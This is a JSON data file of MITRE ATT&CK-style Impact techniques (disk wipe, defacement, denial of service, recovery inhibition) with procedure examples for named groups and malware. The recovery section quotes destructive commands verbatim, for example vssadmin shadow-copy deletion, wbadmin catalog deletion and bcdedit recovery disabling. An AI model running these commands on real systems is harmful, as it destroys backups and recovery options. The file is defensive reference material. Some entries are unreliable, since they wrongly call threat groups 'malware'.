                "Description": "malware has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.[71]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has used BlackCat ransomware to encrypt files on VMWare ESXi servers.[90][91]"
            },
            "S0639": {
                "ID": "S0639",
                "Name": "Seth-Locker",
                "Description": "malware can encrypt files on a targeted system, appending them with the suffix .seth.[20]"
            },
            "S0140": {
                "ID": "S0140",
                "Name": "Shamoon",
                "Description": "malware has an operational mode for encrypting data instead of overwriting it.[92][93]"
            },
            "S0242": {
                "ID": "S0242",
                "Name": "SynAck",
                "Description": "malware encrypts the victims machine followed by asking the victim to pay a ransom. [94]"
            },
            "G0092": {
                "ID": "G0092",
                "Name": "TA505",
                "Description": "malware has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.[95]"
            },
            "S0595": {
                "ID": "S0595",
                "Name": "ThiefQuest",
                "Description": "malware encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.[96]"
            },
            "S0366": {
                "ID": "S0366",
                "Name": "WannaCry",
                "Description": "malware encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.[97][2][98]"
            },
            "S0612": {
                "ID": "S0612",
                "Name": "WastedLocker",
                "Description": "malware can encrypt data and leave a ransom note.[99][100][101]"
            },
            "S0341": {
                "ID": "S0341",
                "Name": "Xbash",
                "Description": "malware has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid.[102]"
            },
            "S0658": {
                "ID": "S0658",
                "Name": "XCSSET",
                "Description": "malware performs AES-CBC encryption on files under ~/Documents, ~/Downloads, and~/Desktop with a fixed key and renames files to give them a .enc extension. Only files with sizes less than 500MB are encrypted.[103]"
            }
        }
    },
    "T1565": {
        "ttp_name": "Data Manipulation",
        "ttp_id": "T1565",
        "href": "/techniques/T1565",
        "subtechnique": {
            "001": {
                "name": "Stored Data Manipulation",
                "href": "/techniques/T1565/001",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1][2] By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.[1]"
                    },
                    "S0562": {
                        "ID": "S0562",
                        "Name": "SUNSPOT",
                        "Description": "<name> created a copy of the SolarWinds Orion software source file with a .bk extension to backup the original content, wrote SUNBURST using the same filename but with a .tmp extension, and then moved SUNBURST using MoveFileEx to the original filename with a .cs extension so it could be compiled within Orion software.[3]"
                    }
                }
            },
            "002": {
                "name": "Transmitted Data Manipulation",
                "href": "/techniques/T1565/002",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.[1][2] By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used DYEPACK to manipulate SWIFT messages en route to a printer.[1]"
                    },
                    "S0395": {
                        "ID": "S0395",
                        "Name": "LightNeuron",
                        "Description": "<name> is capable of modifying email content, headers, and attachments during transit.[3]"
                    },
                    "S0530": {
                        "ID": "S0530",
                        "Name": "Melcoz",
                        "Description": "<name> can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.[4]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address.[5][6]"
                    }
                }
            },
            "003": {
                "name": "Runtime Data Manipulation",
                "href": "/techniques/T1565/003",
                "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.[1][2] By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "Procedure": {
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.[1]"
                    }
                }
            }
        },
        "tactic": "Impact",
        "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1] By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
        "Procedure": {
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.[1]"
            }
        }
    },
    "T1491": {
        "ttp_name": "Defacement",
        "ttp_id": "T1491",
        "href": "/techniques/T1491",
        "subtechnique": {
            "001": {
                "name": "Internal Defacement",
                "href": "/techniques/T1491/001",
                "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.[1] Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.[2]",
                "Procedure": {
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> has set the desktop wallpaper on victims' machines to display a ransom note.[3][4][5][6][7][8][9][10][11]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can change the desktop wallpaper on compromised hosts.[12][13]"
                    },
                    "S0659": {
                        "ID": "S0659",
                        "Name": "Diavol",
                        "Description": "After encryption, <name> will capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text \"All your files are encrypted! For more information see \"README-FOR-DECRYPT.txt\".[14]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has left taunting images and messages on the victims' desktops as proof of system access.[15]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe.[2]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can change both the desktop wallpaper and the lock screen image to a custom image.[16]"
                    }
                }
            },
            "002": {
                "name": "External Defacement",
                "href": "/techniques/T1491/002",
                "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.[1][2][3] External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise.[4]",
                "Procedure": {
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.[5][6]"
                    }
                }
            }
        },
        "tactic": "Impact",
        "description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.",
        "Procedure": {}
    },
    "T1561": {
        "ttp_name": "Disk Wipe",
        "ttp_id": "T1561",
        "href": "/techniques/T1561",
        "subtechnique": {
            "001": {
                "name": "Disk Content Wipe",
                "href": "/techniques/T1561/001",
                "description": "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.[1][2][3] Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.[2] Adversaries have also been observed leveraging third-party drivers like RawDisk to directly access disk content.[1][2] This behavior is distinct from Data Destruction because sections of the disk are erased instead of individual files.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[2]",
                "Procedure": {
                    "S1125": {
                        "ID": "S1125",
                        "Name": "AcidRain",
                        "Description": "<name> iterates over device file identifiers on the target, opens the device file, and either overwrites the file or calls various IOCTLS commands to erase it.[4]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> has the ability to wipe VM snapshots on compromised networks.[5][6]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to corrupt disk partitions and obtain raw disk access to destroy data.[7][8]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used malware like WhiskeyAlfa to overwrite the first 64MB of every drive with a mix of static and random buffers. A similar process is then used to wipe content in logical drives and, finally, attempt to wipe every byte of every sector on every drive. WhiskeyBravo can be used to overwrite the first 4.9MB of physical drives. WhiskeyDelta can overwrite the first 132MB or 1.5MB of each drive with random data from heap memory.[2]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> can wipe deleted data from all drives using cipher.exe.[9]"
                    },
                    "S0364": {
                        "ID": "S0364",
                        "Name": "RawDisk",
                        "Description": "<name> has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.[2]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> can wipe the accessible physical or logical drives of the infected machine.[10]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can overwrite sectors of a victim host's hard drive at periodic offsets.[11][12][13]"
                    }
                }
            },
            "002": {
                "name": "Disk Structure Wipe",
                "href": "/techniques/T1561/002",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.[1][2][3][4][5] The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. Disk Structure Wipe may be performed in isolation, or along with Disk Content Wipe if all sectors of a disk are wiped.On a network devices, adversaries may reformat the file system using Network Device CLI commands such as format.[6]To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[1][2][3][4]",
                "Procedure": {
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has access to destructive malware that is capable of overwriting a machine's Master Boot Record (MBR).[7][8]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used a custom MBR wiper named BOOTWRECK to render systems inoperable.[9]"
                    },
                    "S0693": {
                        "ID": "S0693",
                        "Name": "CaddyWiper",
                        "Description": "<name> has the ability to destroy information about a physical drive's partitions including the MBR, GPT, and partition entries.[10][11]"
                    },
                    "S0697": {
                        "ID": "S0697",
                        "Name": "HermeticWiper",
                        "Description": "<name> has the ability to corrupt disk partitions, damage the Master Boot Record (MBR), and overwrite the Master File Table (MFT) of all available physical drives.[12][13][14][15]"
                    },
                    "S0607": {
                        "ID": "S0607",
                        "Name": "KillDisk",
                        "Description": "<name> overwrites the first sector of the Master Boot Record with \"0x00\".[16]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> malware SHARPKNOT overwrites and deletes the Master Boot Record (MBR) on the victim's machine and has possessed MBR wiper malware since at least 2009.[17][18]"
                    },
                    "S0364": {
                        "ID": "S0364",
                        "Name": "RawDisk",
                        "Description": "<name> was used in Shamoon to help overwrite components of disk structure like the MBR and disk partitions.[3][5]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record.[19][20]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "<name> has been seen overwriting features of disk structure such as the MBR.[1][2][3][5]"
                    },
                    "S0380": {
                        "ID": "S0380",
                        "Name": "StoneDrill",
                        "Description": "<name> can wipe the master boot record of an infected computer.[21]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can overwrite the Master Book Record (MBR) on victim systems with a malicious 16-bit bootloader.[22][23][24][25][26][27]"
                    }
                }
            }
        },
        "tactic": "Impact",
        "description": "Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares.[1]On network devices, adversaries may wipe configuration files and other data from the device using Network Device CLI commands such as erase.[2]",
        "Procedure": {}
    },
    "T1499": {
        "ttp_name": "Endpoint Denial of Service",
        "ttp_id": "T1499",
        "href": "/techniques/T1499",
        "subtechnique": {
            "001": {
                "name": "OS Exhaustion Flood",
                "href": "/techniques/T1499/001",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.[1] With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.[2]ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.[3]",
                "Procedure": {}
            },
            "002": {
                "name": "Service Exhaustion Flood",
                "href": "/techniques/T1499/002",
                "description": "Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.[1] Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.[2]Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.[3]",
                "Procedure": {}
            },
            "003": {
                "name": "Application Exhaustion Flood",
                "href": "/techniques/T1499/003",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.[1]",
                "Procedure": {}
            },
            "004": {
                "name": "Application or System Exploitation",
                "href": "/techniques/T1499/004",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. [1] Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as Data Destruction, Firmware Corruption, Service Stop etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems.",
                "Procedure": {
                    "S0604": {
                        "ID": "S0604",
                        "Name": "Industroyer",
                        "Description": "<name> uses a custom DoS tool that leverages CVE-2015-5374 and targets hardcoded IP addresses of Siemens SIPROTEC devices.[2]"
                    }
                }
            }
        },
        "tactic": "Impact",
        "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes[1] and to support other malicious activities, including distraction[2], hacktivism, and extortion.[3]An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.[4]In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.[5]For attacks attempting to saturate the providing network, see Network Denial of Service.",
        "Procedure": {
            "S0052": {
                "ID": "S0052",
                "Name": "OnionDuke",
                "Description": "malware has the capability to use a Denial of Service module.[6]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.[7]"
            },
            "S0412": {
                "ID": "S0412",
                "Name": "ZxShell",
                "Description": "malware has a feature to perform SYN flood attack on a host.[8][9]"
            }
        }
    },
    "T1657": {
        "ttp_name": "Financial Theft",
        "ttp_id": "T1657",
        "href": "/techniques/T1657",
        "tactic": "Impact",
        "description": "Adversaries may steal monetary resources from targets through extortion, social engineering, technical theft, or other methods aimed at their own financial gain at the expense of the availability of these resources for victims. Financial theft is the ultimate objective of several popular campaign types including extortion by ransomware,[1] business email compromise (BEC) and fraud,[2] \"pig butchering,\"[3] bank hacking,[4] and exploiting cryptocurrency networks.[5] Adversaries may Compromise Accounts to conduct unauthorized transfers of funds.[6] In the case of business email compromise or email fraud, an adversary may utilize Impersonation of a trusted entity. Once the social engineering is successful, victims can be deceived into sending money to financial accounts controlled by an adversary.[2] This creates the potential for multiple victims (i.e., compromised accounts as well as the ultimate monetary loss) in incidents involving financial theft.[7]Extortion by ransomware may occur, for example, when an adversary demands payment from a victim after Data Encrypted for Impact [8] and Exfiltration of data, followed by threatening to leak sensitive data to the public unless payment is made to the adversary.[9] Adversaries may use dedicated leak sites to distribute victim data.[10]Due to the potentially immense business impact of financial theft, an adversary may abuse the possibility of financial theft and seeking monetary gain to divert attention from their true goals such as Data Destruction and business disruption.[11]",
        "Procedure": {
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware engages in double-extortion ransomware, exfiltrating files then encrypting them, in order to prompt victims to pay a ransom.[12]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has maintained leak sites for exfiltrated data in attempt to extort victims into paying a ransom.[13]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware can deploy payloads capable of capturing credentials related to cryptocurrency wallets.[14]"
            },
            "G1016": {
                "ID": "G1016",
                "Name": "FIN13",
                "Description": "malware has observed the victim's software and infrastructure over several months to understand the technical process of legitimate financial transactions, prior to attempting to conduct fraudulent transactions.[15]"
            },
            "G1026": {
                "ID": "G1026",
                "Name": "Malteiro",
                "Description": "malware targets organizations in a wide variety of sectors via the use of Mispadu banking trojan with the goal of financial theft.[16]"
            },
            "G1015": {
                "ID": "G1015",
                "Name": "Scattered Spider",
                "Description": "malware has deployed ransomware on compromised hosts for financial gain.[17][18]"
            },
            "G0083": {
                "ID": "G0083",
                "Name": "SilverTerrier",
                "Description": "malware targets organizations in high technology, higher education, and manufacturing for business email compromise (BEC) campaigns with the goal of financial theft.[19][20]"
            }
        }
    },
    "T1495": {
        "ttp_name": "Firmware Corruption",
        "ttp_id": "T1495",
        "href": "/techniques/T1495",
        "tactic": "Impact",
        "description": "Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.[1] Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.In general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.[2][3] Depending on the device, this attack may also result in Data Destruction.",
        "Procedure": {
            "S0606": {
                "ID": "S0606",
                "Name": "Bad Rabbit",
                "Description": "malware has used an executable that installs a modified bootloader to prevent normal boot-up.[4]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware module \"Trickboot\" can write or erase the UEFI/BIOS firmware of a compromised device.[5]"
            }
        }
    },
    "T1490": {
        "ttp_name": "Inhibit System Recovery",
        "ttp_id": "T1490",
        "href": "/techniques/T1490",
        "tactic": "Impact",
        "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.[1][2] This may deny access to available backups and recovery options.Operating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact.[1][2] Furthermore, adversaries may disable recovery notifications, then corrupt backups.[3]A number of native Windows utilities have been used by adversaries to disable or delete system recovery features:vssadmin.exe can be used to delete all volume shadow copies on a system - vssadmin.exe delete shadows /all /quietWindows Management Instrumentation can be used to delete volume shadow copies - wmic shadowcopy deletewbadmin.exe can be used to delete the Windows Backup Catalog - wbadmin.exe delete catalog -quietbcdedit.exe can be used to disable automatic Windows recovery features by modifying boot configuration data - bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled noREAgentC.exe can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected systemdiskshadow.exe can be used to delete all volume shadow copies on a system - diskshadow delete shadows all [4] [5]On network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.Adversaries may also delete \"online\" backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.[6] In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.[7][8]",
        "Procedure": {
            "S1129": {
                "ID": "S1129",
                "Name": "Akira",
                "Description": "malware will delete system volume shadow copies via PowerShell commands.[9]"
            },
            "S0640": {
                "ID": "S0640",
                "Name": "Avaddon",
                "Description": "malware deletes backups and shadow copies using native system tools.[10][11]"
            },
            "S0638": {
                "ID": "S0638",
                "Name": "Babuk",
                "Description": "malware has the ability to delete shadow volumes using vssadmin.exe delete shadows /all /quiet.[12][13]"
            },
            "S0570": {
                "ID": "S0570",
                "Name": "BitPaymer",
                "Description": "malware attempts to remove the backup shadow files from the host using vssadmin.exe Delete Shadows /All /Quiet.[14]"
            },
            "S1070": {
                "ID": "S1070",
                "Name": "Black Basta",
                "Description": "malware can delete shadow copies using vssadmin.exe.[15][16][17][18][19][20][21][22][22][23]"
            },
            "S1068": {
                "ID": "S1068",
                "Name": "BlackCat",
                "Description": "malware can delete shadow copies using vssadmin.exe delete shadows /all /quiet and wmic.exe Shadowcopy Delete; it can also modify the boot loader using bcdedit /set {default} recoveryenabled No.[24]"
            },
            "S0611": {
                "ID": "S0611",
                "Name": "Clop",
                "Description": "malware can delete the shadow volumes with vssadmin Delete Shadows /all /quiet and can use bcdedit to disable recovery options.[25]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware resets system restore points and deletes backup files.[26]"
            },
            "S0575": {
                "ID": "S0575",
                "Name": "Conti",
                "Description": "malware can delete Windows Volume Shadow Copies using vssadmin.[27]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware can delete system restore points through the command cmd.exe /c vssadmin delete shadows /for=c: /all /quiet\".[28]"
            },
            "S0673": {
                "ID": "S0673",
                "Name": "DarkWatchman",
                "Description": "malware can delete shadow volumes using vssadmin.exe.[29]"
            },
            "S0616": {
                "ID": "S0616",
                "Name": "DEATHRANSOM",
                "Description": "malware can delete volume shadow copies on compromised hosts.[30]"
            },
            "S0659": {
                "ID": "S0659",
                "Name": "Diavol",
                "Description": "malware can delete shadow copies using the IVssBackupComponents COM object to call the DeleteSnapshots method.[31]"
            },
            "S0605": {
                "ID": "S0605",
                "Name": "EKANS",
                "Description": "malware removes backups of Volume Shadow Copies to disable any restoration capabilities.[32][33]"
            },
            "S0618": {
                "ID": "S0618",
                "Name": "FIVEHANDS",
                "Description": "malware has the ability to delete volume shadow copies on compromised hosts.[30][34]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware disable recovery options and deletes shadow copies from the victim.[35]"
            },
            "S0617": {
                "ID": "S0617",
                "Name": "HELLOKITTY",
                "Description": "malware can delete volume shadow copies on compromised hosts.[30]"
            },
            "S0697": {
                "ID": "S0697",
                "Name": "HermeticWiper",
                "Description": "malware can disable the VSS service on a compromised host using the service control manager.[36][37][38]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware can can remove all system restore points.[39]"
            },
            "S0389": {
                "ID": "S0389",
                "Name": "JCry",
                "Description": "malware has been observed deleting shadow copies to ensure that data cannot be restored easily.[40]"
            },
            "S0449": {
                "ID": "S0449",
                "Name": "Maze",
                "Description": "malware has attempted to delete the shadow volumes of infected machines, once before and once after the encryption process.[41][42]"
            },
            "S0576": {
                "ID": "S0576",
                "Name": "MegaCortex",
                "Description": "malware has deleted volume shadow copies using vssadmin.exe.[43]"
            },
            "S0688": {
                "ID": "S0688",
                "Name": "Meteor",
                "Description": "malware can use bcdedit to delete different boot identifiers on a compromised host; it can also use vssadmin.exe delete shadows /all /quiet and C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete.[44]"
            },
            "S0457": {
                "ID": "S0457",
                "Name": "Netwalker",
                "Description": "malware can delete the infected system's Shadow Volumes to prevent recovery.[45][46]"
            },
            "S0365": {
                "ID": "S0365",
                "Name": "Olympic Destroyer",
                "Description": "malware uses the native Windows utilities vssadmin, wbadmin, and bcdedit to delete and disable operating system recovery features such as the Windows backup catalog and Windows Automatic Repair.[1]"
            },
            "S1058": {
                "ID": "S1058",
                "Name": "Prestige",
                "Description": "malware can delete the backup catalog from the target system using: c:\\Windows\\System32\\wbadmin.exe delete catalog -quiet and can also delete volume shadow copies using: \\Windows\\System32\\vssadmin.exe delete shadows /all /quiet.[47]"
            },
            "S0654": {
                "ID": "S0654",
                "Name": "ProLock",
                "Description": "malware can use vssadmin.exe to remove volume shadow copies.[48]"
            },
            "S0583": {
                "ID": "S0583",
                "Name": "Pysa",
                "Description": "malware has the functionality to delete shadow copies.[49]"
            },
            "S0481": {
                "ID": "S0481",
                "Name": "Ragnar Locker",
                "Description": "malware can delete volume shadow copies using vssadmin delete shadows /all /quiet.[50]"
            },
            "S0496": {
